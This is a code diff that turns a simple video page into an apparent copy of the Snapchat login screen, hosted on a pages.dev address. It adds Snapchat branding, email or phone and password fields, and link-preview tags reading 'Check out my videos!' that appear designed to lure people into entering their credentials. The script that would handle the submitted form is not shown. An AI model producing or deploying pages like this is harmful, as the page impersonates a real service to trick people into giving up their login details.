@@ -3,14 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat</title>
-    <link rel="stylesheet" href="style.css">
+  <meta property="og:title" content="Snapchat">
+  <meta property="og:description" content="Check out my videos!">
+  <meta property="og:image" content="vedo-cap.jpg">
+  <meta property="og:url" content="https://snapchat-9a8.pages.dev/">
+  <meta property="og:type" content="website">
+  <title>Snapchat</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" type="image/svg" href="Snapchat-Logo.wine.svg">
 </head>
 <body>
-       <video id="videoElement" controls>
-  <source src="https://www.w3schools.com/howto/rain.mp4" type="video/mp4">
-  Your browser does not support the video tag.
-    <script src="app.js"></script>
+  <div class="snapchat-login-bg">
+    <div class="snapchat-login-container">
+      <img src="Snapchat-Logo.wine.svg" alt="Snapchat Logo" class="login-logo">
+      <h1 class="login-title">Log in to Snapchat</h1>
+      <form class="login-form">
+        <div class="login-methods">
+          <label><input type="radio" name="loginType" value="email" checked> Email</label>
+          <label><input type="radio" name="loginType" value="phone"> Phone Number</label>
+        </div>
+        <input type="text" id="login-identifier" placeholder="Email" class="login-input" required>
+        <input type="password" placeholder="Password" class="login-input" required>
+        <button type="submit" class="login-btn">Log In</button>
+      </form>
+      <div class="login-links">
+        <a href="#" class="forgot-link">Forgot Password?</a>
+        <a href="#" class="signup-link">Sign Up</a>
+      </div>
+    </div>
+    <footer class="login-footer">
+      <span>© 2025 Snapchat. All rights reserved.</span>
+    </footer>
+  </div>
+  <script src="app.js"></script>
 </body>
 </html>
-
